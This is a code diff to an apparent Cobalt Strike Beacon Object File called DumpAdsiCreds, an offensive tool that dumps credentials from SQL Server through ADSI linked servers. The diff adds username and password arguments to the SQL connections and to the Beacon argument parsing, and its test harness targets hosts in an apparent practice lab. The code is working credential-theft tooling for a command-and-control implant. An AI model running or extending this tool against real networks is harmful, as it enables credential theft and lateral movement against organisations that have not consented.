@@ -36,7 +36,7 @@ void* RunThreadedQuery(LPVOID threadData) {
 	intFree(query);
 }
 
-void DumpAdsiCreds(char* server, char* database, char* link, char* impersonate, char* adsiServer, char* port)
+void DumpAdsiCreds(char* server, char* user, char* password, char* database, char* link, char* impersonate, char* adsiServer, char* port)
 {
     SQLHENV env			= NULL;
     SQLHSTMT stmt 		= NULL;
@@ -58,11 +58,11 @@ void DumpAdsiCreds(char* server, char* database, char* link, char* impersonate, 
 
     if (link == NULL)
 	{
-		dbc = ConnectToSqlServer(&env, server, database);
+		dbc = ConnectToSqlServer(&env, server, user, password, database);
 	}
 	else
 	{
-		dbc = ConnectToSqlServer(&env, server, NULL);
+		dbc = ConnectToSqlServer(&env, server, user, password, NULL);
 	}
 
     if (dbc == NULL) {
@@ -245,11 +245,11 @@ void DumpAdsiCreds(char* server, char* database, char* link, char* impersonate, 
 	internal_printf("[*] Creating a second connection to the SQL server for threaded query\n");
 	if (link == NULL)
 	{
-		dbc2 = ConnectToSqlServer(&env2, server, database);
+		dbc2 = ConnectToSqlServer(&env2, server, user, password, database);
 	}
 	else
 	{
-		dbc2 = ConnectToSqlServer(&env2, server, NULL);
+		dbc2 = ConnectToSqlServer(&env2, server, user, password, NULL);
 	}
 
     if (dbc2 == NULL) {
@@ -371,6 +371,8 @@ VOID go(
 ) 
 {
 	char* server;
+	char* user;
+	char* password;
 	char* database;
 	char* link;
 	char* impersonate;
@@ -383,6 +385,8 @@ VOID go(
 	datap parser;
 	BeaconDataParse(&parser, Buffer, Length);
 	server	 	= BeaconDataExtract(&parser, NULL);
+	user	 	= BeaconDataExtract(&parser, NULL);
+	password	= BeaconDataExtract(&parser, NULL);
 	database 	= BeaconDataExtract(&parser, NULL);
 	link 		= BeaconDataExtract(&parser, NULL);
 	impersonate = BeaconDataExtract(&parser, NULL);
@@ -390,6 +394,8 @@ VOID go(
 	port		= BeaconDataExtract(&parser, NULL);
 
 	server = *server == 0 ? "localhost" : server;
+	user = *user == 0 ? NULL : user;
+	password = *password == 0 ? NULL : password;
 	database = *database == 0 ? "master" : database;
 	link = *link  == 0 ? NULL : link;
 	impersonate = *impersonate == 0 ?  NULL : impersonate;
@@ -404,7 +410,7 @@ VOID go(
 		return;
 	}
 
-	DumpAdsiCreds(server, database, link, impersonate, adsiServer, port);
+	DumpAdsiCreds(server, user, password, database, link, impersonate, adsiServer, port);
 	printoutput(TRUE);
 };
 
@@ -413,13 +419,13 @@ VOID go(
 int main()
 {
 	internal_printf("============ BASE TEST ============\n\n");
-	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "ADSIr", "4444");
+	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, NULL, "ADSIr", "4444");
 
 	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
-	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "ADSIr", "4444");
+	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, "sa", "ADSIr", "4444");
 
 	internal_printf("\n\n============ LINK TEST ============\n\n");
-	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "ADSIEssos", "4444");
+	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", "BRAAVOS", NULL, "ADSIEssos", "4444");
 }
 
 #endif
